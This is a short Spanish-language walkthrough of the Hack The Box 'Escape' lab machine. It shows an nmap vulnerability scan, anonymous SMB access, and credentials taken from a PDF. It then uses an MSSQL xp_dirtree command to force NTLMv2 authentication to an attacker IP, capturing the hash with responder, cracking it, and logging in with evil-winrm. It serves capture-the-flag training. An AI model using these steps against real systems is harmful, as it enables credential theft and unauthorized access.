# EscapeWriteUp
Writeup de Escape HTB

Empezamos con un escaneo de nmap

~~~
sudo nmap -v -sS -oX vulnerabilidades.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl" --script=vuln 10.10.11.202 -Pn -p-
~~~

![imagen](https://user-images.githubusercontent.com/108554878/225091888-805b94d6-57ee-498d-af53-2c3c3c00bea3.png)


Vemos smb en el 445, mssql en el 1433 y winrm en el 5985

Primero que nada entramos de forma anónima a smb 

![imagen](https://user-images.githubusercontent.com/108554878/225092170-f200660f-a15e-40b8-ae23-c93d50935bc2.png)

Vemos varias carpetas

Entremos a public

![imagen](https://user-images.githubusercontent.com/108554878/225092256-ca7e5137-d942-40ca-a97e-8a878a277018.png)

Vemos un pdf

Dentro del pdf encontramos unas credenciales

![imagen](https://user-images.githubusercontent.com/108554878/225092313-54426388-d5f5-476b-a821-4dc22c83dfdf.png)

Con esto nos logueamos en mssql

![imagen](https://user-images.githubusercontent.com/108554878/225092412-f47b7273-20a7-4d2c-80dd-b48e7ecb6589.png)

Estando aqui leemos que se puede hacer en mssql para entrar a la máquina

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

Después de intentar varias cosas que vienen en la documentación ponemos

~~~
exec master.dbo.xp_dirtree '\\10.10.14.168\any\thing'
~~~

Seteamos con responder algo que consiga las credenciales NTLMv2

~~~
sudo responder -I tun0 -w 
~~~

![imagen](https://user-images.githubusercontent.com/108554878/225092571-457a1cea-ac33-4e26-84c3-91273dd7b1c1.png)

Ahora crackeamos el hash

![imagen](https://user-images.githubusercontent.com/108554878/225092636-eb65cfa3-2f09-43ec-81e0-e86baa09556c.png)

Encontramos las credenciales y entramos con evilwinrm

![HTB](https://user-images.githubusercontent.com/108554878/225093047-66a8ac6e-ca60-4b73-aa5e-4236317578dd.png)

Entramos con evil-winrm

Vemos que hay un errorlog .BAK

Aquí encontramos las credenciales de Ryan.Cooper

![HTB](https://user-images.githubusercontent.com/108554878/225093457-d8d46db7-36ee-45a0-8b0d-e3299bb386db.png)


